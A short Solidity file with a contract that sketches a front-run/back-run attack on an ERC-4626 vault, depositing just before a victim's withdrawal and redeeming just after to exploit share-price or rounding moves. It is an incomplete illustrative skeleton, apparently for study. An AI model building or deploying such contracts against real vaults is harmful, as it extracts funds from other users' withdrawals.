
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault4626 {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
}

// Generic front-run pattern — in practice the attacker scripts two txs
// around the victim's withdrawal to exploit rounding / share-price moves.
contract WithdrawFrontRun {
    IVault4626 public vault;

    constructor(address _vault) {
        vault = IVault4626(_vault);
    }

    function frontRun(uint256 assets) external returns (uint256 shares) {
        // Deposit right before victim's withdraw to change share price
        shares = vault.deposit(assets, address(this));
    }

    function backRun(uint256 shares) external returns (uint256 assets) {
        // Exit right after victim's withdraw
        assets = vault.redeem(shares, address(this), address(this));
    }
}
